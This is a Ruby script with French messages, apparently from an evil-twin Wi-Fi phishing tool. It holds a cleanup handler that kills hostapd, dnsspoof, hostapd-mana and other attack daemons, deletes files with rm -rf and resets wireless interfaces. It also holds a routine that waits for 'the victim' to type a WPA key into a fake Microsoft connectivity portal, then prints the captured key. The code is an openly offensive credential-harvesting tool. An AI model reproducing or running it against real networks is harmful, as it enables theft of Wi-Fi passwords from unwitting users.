#!/usr/bin/env ruby


require 'gtk2'
require 'open3'
require 'highline/import'
require 'colorize'


trap "SIGINT" do
  puts "\e[1;94m[*] Exit... nettoyage des fichiers\e[0m"
sleep 3
Dir.chdir '/tmp/hostbase-1.5FR'
sleep 1
if File.exist?("cartef.txt")
Dir.chdir '/tmp'
sleep 1
`rm -rf hostapd.psk`
`killall hostapd`
`rm -rf *.conf`
`killall dnsspoof`
`killall xterm`
`killall dhcpd`
`killall wash`
`killall bash`
`killall wpa_supplicant`
Dir.chdir '/tmp/hostbase-1.5FR'
sleep 1
`rm -rf *.pid`
File.open("cartef.txt").readlines.each do |cartef|
   puts cartef
$cartef = cartef.chomp
File.open("cartebis.txt").readlines.each do |cartebis|
   puts cartebis
$cartebis = cartebis.chomp
puts "Retour au mode normal des interfaces wifi..."
`ifconfig #{$cartef} down`
`iw dev #{$cartef} set type managed`
sleep 2
`ip link set #{$cartef} up`
         sleep 2
`ifconfig #{$cartebis} down`
`iw dev #{$cartebis} set type managed`
sleep 2
`ip link set #{$cartebis} up`
         sleep 2         
`systemctl enable NetworkManager.service`
sleep 2
`systemctl start NetworkManager.service`
sleep 4
`rm -rf /var/lib/dhcp/dhcpd.leases`
`rm -rf *.txt`
puts "Bye..."
exit
end
end
else
`rm -rf *.pid`
`killall wpa_supplicant`
`killall berate_ap`
`killall hostapd-mana`
`killall wash`
Dir.chdir '/tmp/hostbase-1.5FR'
sleep 1
`rm -rf *.pid`
`rm -rf *.txt`
puts "Retour au mode normal des interfaces wifi..."
`killall berate_ap`
`killall hostapd-mana`
`ifconfig wlan5 down`
`ip link set wlan5 name wlan1`
`ip link set wlan1 down`
sleep 1
`iw dev wlan1 set type managed`
sleep 2
`ip link set wlan1 up`
         sleep 5
`systemctl enable NetworkManager.service`
sleep 4
`systemctl start NetworkManager.service`
sleep 5
`rm -rf /var/lib/dhcp/dhcpd.leases`
`killall wash`
`killall bash`
puts "Bye..."
exit
end
end

class Cle
def self.clewpa
puts "En attente de la victime... appuyez sur CTRL+C pour quitter..."
loop do
sleep 1
if File.zero?("/var/www/msftconnecttest/cle.txt")
else
puts "\e[1;32m[*] L clé wifi WPA a été rentrée et sauvegardé dans le répertoire: /var/www/msftconnecttest/cle.txt\e[0m"
puts "\e[1;32m[*] Commande pour récupérer et sauvegarder la clé WPA: cat /var/www/msftconnecttest/cle.txt\e[0m"
puts "\e[1;32m[*] Clé wifi WPA-PSK:\e[0m"
Dir.chdir '/var/www/msftconnecttest'
sleep 2
File.open("cle.txt").readlines.each do |wpa|
   puts wpa.red
end
break
end
end
end
end


